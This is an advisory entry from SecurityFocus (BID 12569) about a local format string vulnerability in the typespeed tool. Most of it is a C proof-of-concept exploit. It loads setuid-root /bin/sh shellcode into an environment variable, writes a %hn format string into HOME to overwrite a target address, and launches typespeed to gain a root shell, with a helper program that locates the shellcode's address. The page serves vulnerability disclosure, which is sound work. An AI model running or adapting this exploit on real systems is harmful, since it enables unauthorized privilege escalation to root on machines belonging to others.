source: http://www.securityfocus.com/bid/12569/info

typespeed is prone to a local format string vulnerability. Successful could allow privilege escalation. 

/*

Proof of Concept local exploit for typespeed tool

"enva" content:

*********************************************
#include <stdio.h>
#include <string.h>
  int main(int argc, char *argv[])
  {
  char *addr_ptr = NULL;
  addr_ptr = getenv(argv[1]);
  printf("%s @ %p\n", argv[1], addr_ptr);
  return 0;
  }
*********************************************

*/

#include <stdio.h>
#define offset 2
#define var (0x08050288+0x4)

char shellcode[] = 
"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0"
"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"
"\x31\xc0\xb0\x01\xcd\x80";

int main(int argc, char *argv[])
{
char *addr[3] = { ((char *)var +2),
		  ((char *)var),
		};

char buffer[1024];
int high, low;
long target;

target = 0xbffff950;

high = (target & 0xffff0000) >> 16;
low = (target & 0x0000ffff);

high -= 0x8;
sprintf(buffer, "%s%%.%dx%%%d$hn%%.%dx%%%d$hn", 
		&addr,
		high,
		offset,
		(low - high)-0x8,
		offset+1);
memset(buffer+strlen(buffer), 0x41, 32);

setenv("HOME", buffer, 1);
setenv("SHELLCODE", shellcode, 1);
system("./enva SHELLCODE");
system("./typespeed");
}